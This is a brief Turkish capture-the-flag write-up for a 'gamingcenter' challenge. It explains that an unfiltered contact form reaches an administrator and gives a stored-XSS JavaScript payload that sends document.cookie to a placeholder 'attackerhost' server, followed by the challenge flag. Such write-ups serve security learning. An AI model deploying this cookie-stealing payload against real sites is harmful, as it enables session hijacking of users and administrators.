![gamingcenter-1](https://github.com/enesdemir41/CTFs/assets/49167863/3b18f727-dfe5-4a24-8f57-843b6594f7cb)

Contact Form alanı Mevcut

Herhangi Bir kontrol yapılmamakta ve gönderilen veriler bir yetkilinin önüne düşmekte. Xss ile cookie bilgisini alalım

        var xhr=new XMLHttpRequest(); 
        xhr.open("GET", "https://attackerhost/?"+document.cookie, true); 
        xhr.send();

Kontorl altımızda olan bir sunucuya istek yaptırıldığında flagi görebiliriz. GOP{hellog_baby_its_my_xss_flag}
